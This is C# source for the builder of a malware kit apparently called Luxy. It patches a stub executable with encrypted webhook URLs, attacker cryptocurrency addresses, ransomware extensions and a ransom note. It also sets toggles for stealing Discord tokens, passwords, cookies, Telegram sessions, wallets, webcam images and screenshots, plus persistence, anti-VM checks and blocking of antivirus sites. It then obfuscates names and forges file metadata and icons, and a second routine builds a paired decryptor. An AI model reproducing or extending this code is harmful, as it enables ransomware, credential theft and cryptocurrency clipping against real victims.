using System;
using System.Threading;
using System.IO;
using System.Linq;
using System.Text;
using Jose;
using Luxy.Components.Utilities;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Mono.Cecil.Rocks;
using Vestris.ResourceLib;

namespace Luxy.Components.Builder
{
    internal static class Builder
    {
        private static byte[] stubbytes = Properties.Resources.LuxyStub;
        private static byte[] decryptorbytes = Properties.Resources.Luxy_Decryptor;
        public static void Build(string outputFile)
        {

            var gunaMessageBox = new Guna.UI2.WinForms.Guna2MessageDialog();
            gunaMessageBox.Style = Guna.UI2.WinForms.MessageDialogStyle.Dark;
            gunaMessageBox.Buttons = Guna.UI2.WinForms.MessageDialogButtons.OK;

            var iv = Encoding.UTF8.GetBytes(Common.GenerateRandomString(12));
            var key = Encoding.UTF8.GetBytes(Common.GenerateRandomString(32));

            try
            {
                if (File.Exists(outputFile))
                {
                    File.Delete(outputFile);
                }

                var tempFile = $"{Path.GetTempPath()}\\{ Common.GenerateRandomString(10)}.tmp";

                File.WriteAllBytes(tempFile, stubbytes);

                var assembly = AssemblyDefinition.ReadAssembly(tempFile);

                // Modules
                var settings_modules = assembly.MainModule.Types.Single(x => x.FullName == "LuxyStub.Settings");
                var cctor_modules = settings_modules.GetStaticConstructor();
                // Ransomeware
                var settings_ransomeware = assembly.MainModule.Types.Single(x => x.FullName == "LuxyStub.Modules.Ransomware.Settings");
                var cctor_ransomeware = settings_ransomeware.GetStaticConstructor();
                // Stealer Settings
                var settings_stealer = assembly.MainModule.Types.Single(x => x.FullName == "LuxyStub.Modules.Stealer.Settings");
                var cctor_stealer = settings_stealer.GetStaticConstructor();
                // Clipper Settings
                var settings_clipper = assembly.MainModule.Types.Single(x => x.FullName == "LuxyStub.Modules.Clipper.Settings");
                var cctor_clipper = settings_clipper.GetStaticConstructor();


                var strings = 0;
                var bools = 0;

                // Clipper settings
                foreach (var instruction in cctor_clipper.Body.Instructions)
                {
                    if (instruction.OpCode == OpCodes.Ldstr) // String
                    {
                        switch (++strings)
                        {
                            case 1: //key
                                instruction.Operand = Convert.ToBase64String(key);
                                break;

                            case 2: // iv
                                instruction.Operand = Convert.ToBase64String(iv);
                                break;

                            case 3: // encryptedWebhook
                                instruction.Operand = Encrypt(Settings.WebhookClipper, key, iv);
                                break;

                            case 4: // btcAddr
                                instruction.Operand = Encrypt(Settings.BtcAddr, key, iv);
                                break;

                            case 5: // ethAddr
                                instruction.Operand = Encrypt(Settings.EthAddr, key, iv);
                                break;

                            case 6: // dogeAddr
                                instruction.Operand = Encrypt(Settings.DogeAddr, key, iv);
                                break;

                            case 7: // ltcAddr
                                instruction.Operand = Encrypt(Settings.LtcAddr, key, iv);
                                break;

                            case 8: // dashAddr
                                instruction.Operand = Encrypt(Settings.DashAddr, key, iv);
                                break;

                            case 9: // xmrAddr
                                instruction.Operand = Encrypt(Settings.XmrAddr, key, iv);
                                break;

                            case 10: // bchAddr
                                instruction.Operand = Encrypt(Settings.BchAddr, key, iv);
                                break;
                        }
                    }
                    else if (instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1)
                    {
                        switch (++bools)
                        {
                            case 1: // btcClip
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.BtcClip ? 1 : 0;
                                break;

                            case 2: // ethClip
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.EthClip ? 1 : 0;
                                break;

                            case 3: // dogeClip
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.DogeClip ? 1 : 0;
                                break;

                            case 4: // ltcClip
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.LtcClip ? 1 : 0;
                                break;

                            case 5: // dashClip
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.DashClip ? 1 : 0;
                                break;

                            case 6: // xmrClip
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.XmrClip ? 1 : 0;
                                break;

                            case 7: // bchClip
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.BchClip ? 1 : 0;
                                break;
                        }
                    }
                }

                bools = 0;
                strings = 0;

                // Stealer settings
                foreach (var instruction in cctor_stealer.Body.Instructions)
                {
                    if (instruction.OpCode == OpCodes.Ldstr) // String
                    {
                        switch (++strings)
                        {
                            case 1: // key
                                instruction.Operand = Convert.ToBase64String(key);
                                break;

                            case 2: // iv
                                instruction.Operand = Convert.ToBase64String(iv);
                                break;

                            case 3: // encryptedWebhook
                                instruction.Operand = Encrypt(Settings.WebhookStealer, key, iv);
                                break;
                        }
                    }
                    else if (instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1)
                    {
                        switch (++bools)
                        {
                            // Stealer Settings
                            case 1: //stealDiscordToken
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.StealDiscordToken ? 1 : 0;
                                break;

                            case 2: //stealPassword
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.StealPasswords ? 1 : 0;
                                break;

                            case 3: //stealCookies
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.StealCookies ? 1 : 0;
                                break;

                            case 4: //stealGames
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.StealGames ? 1 : 0;
                                break;

                            case 5: //stealTelegramSessions
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.StealTelegramSessions ? 1 : 0;
                                break;

                            case 6: //stealSystemInfo
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.StealSystemInfo ? 1 : 0;
                                break;

                            case 7: //network
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.Netwrok ? 1 : 0;
                                break;

                            case 8: //stealWallets
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.StealWallets ? 1 : 0;
                                break;

                            case 9: //TakeWebcam
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.TakeWebcam ? 1 : 0;
                                break;

                            case 10: //TakeScreenshot
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.TakeScreenshot ? 1 : 0;
                                break;
                        }
                    }
                }

                bools = 0;
                strings = 0;

                // Ransomware settings
                foreach (var instruction in cctor_ransomeware.Body.Instructions)
                {
                    if (instruction.OpCode == OpCodes.Ldstr) // String
                    {
                        switch (++strings)
                        {
                            case 1: //key
                                instruction.Operand = Convert.ToBase64String(key);
                                break;

                            case 2: // iv
                                instruction.Operand = Convert.ToBase64String(iv);
                                break;

                            case 3: // encryptedWebhook
                                instruction.Operand = Encrypt(Settings.WebhookRansomeware, key, iv);
                                break;

                            case 4: // encryptedEncryptExtension
                                instruction.Operand = Encrypt(Settings.EncryptExtension, key, iv);
                                break;

                            case 5: // encryptedStrEncryptExtensionList
                                instruction.Operand = Encrypt(Settings.EncryptExtensionList, key, iv);
                                break;

                            case 6: // encryptedReadMeMessage
                                instruction.Operand = Encrypt(Settings.ReadMeMessage, key, iv);
                                break;
                        }
                    }
                    else if (instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1)
                    {
                        switch (++bools)
                        {
                            case 1: //Show Read Me Message
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.ShowReadMeMessage ? 1 : 0;
                                break;
                        }
                    }
                }

                bools = 0;
                strings = 0;

                // Global settings
                foreach (var instruction in cctor_modules.Body.Instructions)
                {
                    if (instruction.OpCode == OpCodes.Ldstr) // String
                    {
                        switch (++strings)
                        {
                            case 1: // key
                                instruction.Operand = Convert.ToBase64String(key);
                                break;

                            case 2: // iv
                                instruction.Operand = Convert.ToBase64String(iv);
                                break;

                            case 3: // encryptedVersion
                                instruction.Operand = Encrypt(Settings.Version, key, iv);
                                break;

                            case 4: // encryptedMutex;
                                instruction.Operand = Encrypt(Settings.Mutex, key, iv);
                                break;
                        }
                    }
                    else if (instruction.OpCode == OpCodes.Ldc_I4_0 || instruction.OpCode == OpCodes.Ldc_I4_1)
                    {
                        switch (++bools)
                        {
                            case 1: //StealerModule
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.StealerModule ? 1 : 0;
                                break;

                            case 2: //RansomewareModule
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.RansomewareModule ? 1 : 0;
                                break;

                            case 3: //ClipperModule
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.ClipperModule ? 1 : 0;
                                break;

                            case 4: //startup
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.Startup ? 1 : 0;
                                break;

                            case 5: //antiVm
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.AntiVm ? 1 : 0;
                                break;

                            case 6: //melt
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.Melt ? 1 : 0;
                                break;

                            case 7: //blockAvSites
                                instruction.OpCode = OpCodes.Ldc_I4;
                                instruction.Operand = Settings.BlockAvSites ? 1 : 0;
                                break;
                        }
                    }
                }

                var renamer = new Renamer(assembly);

                renamer.Perform();
                assembly.Write(outputFile);

                var resource = new VersionResource();
                resource.LoadFrom(outputFile);
                resource.Language = 0;

                var stringFileInfo = (StringFileInfo)resource["StringFileInfo"];
                stringFileInfo["CompanyName"] = Settings.CompanyName;
                stringFileInfo["FileDescription"] = Settings.Description;
                stringFileInfo["ProductName"] = Settings.ProductName;
                stringFileInfo["LegalCopyright"] = Settings.LegalCopyright;
                stringFileInfo["LegalTrademarks"] = Settings.LegalTrademarks;
                stringFileInfo["InternalName"] = Settings.InternalName;
                stringFileInfo["OriginalFilename"] = Settings.OriginalFilename;

                StringTableEntry.ConsiderPaddingForLength = true;
                resource.SaveTo(outputFile);


                if (File.Exists(Settings.IconPath) && Settings.IconPath.ToLower().EndsWith(".ico") && File.Exists(outputFile))
                {
                    try
                    {
                        Thread.Sleep(1);
                        var iconFile = new IconFile(Settings.IconPath);
                        var iconDirectoryResource = new IconDirectoryResource(iconFile);
                        iconDirectoryResource.SaveTo(outputFile);
                    }
                    catch (Exception ex)
                    {
                        gunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Error;
                        gunaMessageBox.Show($"Error: {ex.Message}", "Add Icon Failed");
                    }
                }
                gunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Information;
                gunaMessageBox.Show("Build successfully. Saved file as " + Path.GetFileName(outputFile) + ".", "Build Success");
            }
            catch (Exception ex)
            {
                gunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Error;
                gunaMessageBox.Show($"Build Error: {ex.Message}", "Build Failed");
            }
        }

        public static void BuildDecryptor(string outputFile)
        {
            var gunaMessageBox = new Guna.UI2.WinForms.Guna2MessageDialog();
            gunaMessageBox.Style = Guna.UI2.WinForms.MessageDialogStyle.Dark;
            gunaMessageBox.Buttons = Guna.UI2.WinForms.MessageDialogButtons.OK;

            var iv = Encoding.UTF8.GetBytes(Common.GenerateRandomString(12));
            var key = Encoding.UTF8.GetBytes(Common.GenerateRandomString(32));
            try
            {
                if (File.Exists(outputFile))
                {
                    File.Delete(outputFile);
                }

                var tempFile = $"{Path.GetTempPath()}\\{ Common.GenerateRandomString(10)}.tmp";

                File.WriteAllBytes(tempFile, decryptorbytes);

                var assembly = AssemblyDefinition.ReadAssembly(tempFile);

                // Decryptor
                var settings_decryptor = assembly.MainModule.Types.Single(x => x.FullName == "LuxyDecryptor.Components.Settings");
                var cctor_decryptor = settings_decryptor.GetStaticConstructor();

                var strings = 0;

                // Decryptor settings
                foreach (var instruction in cctor_decryptor.Body.Instructions)
                {
                    if (instruction.OpCode == OpCodes.Ldstr) // String
                    {
                        switch (++strings)
                        {
                            case 1: //key
                                instruction.Operand = Convert.ToBase64String(key);
                                break;

                            case 2: // iv
                                instruction.Operand = Convert.ToBase64String(iv);
                                break;

                            case 3: // encryptedEncryptExtension
                                instruction.Operand = Encrypt(Settings.EncryptExtension, key, iv);
                                break;
                        }
                    }
                }

                var renamer = new Renamer(assembly);

                renamer.Perform();
                assembly.Write(outputFile);

                var resource = new VersionResource();
                resource.LoadFrom(outputFile);
                resource.Language = 0;

                var stringFileInfo = (StringFileInfo)resource["StringFileInfo"];
                stringFileInfo["CompanyName"] = "Luxy";
                stringFileInfo["FileDescription"] = "Luxy.Decryptor";
                stringFileInfo["ProductName"] = "Luxy Decryptor";
                stringFileInfo["LegalCopyright"] = "@2023 - 2024";
                stringFileInfo["LegalTrademarks"] = "";
                stringFileInfo["InternalName"] = "";
                stringFileInfo["OriginalFilename"] = "Luxy.Decryptor.exe";

                StringTableEntry.ConsiderPaddingForLength = true;
                resource.SaveTo(outputFile);

                gunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Information;
                gunaMessageBox.Show("Build successfully. Saved file as " + Path.GetFileName(outputFile) + ".", "Build Success");
            }
            catch (Exception ex)
            {
                gunaMessageBox.Icon = Guna.UI2.WinForms.MessageDialogIcon.Error;
                gunaMessageBox.Show($"Build Error: {ex.Message}", "Build Failed");
            }
        }

        static private string Encrypt(string value, byte[] key, byte[] iv)
        {
            byte[][] structure = AesGcm.Encrypt(key, iv, null, Encoding.UTF8.GetBytes(value));

            return Convert.ToBase64String(structure[0].Concat(structure[1]).ToArray());
        }
    }
}
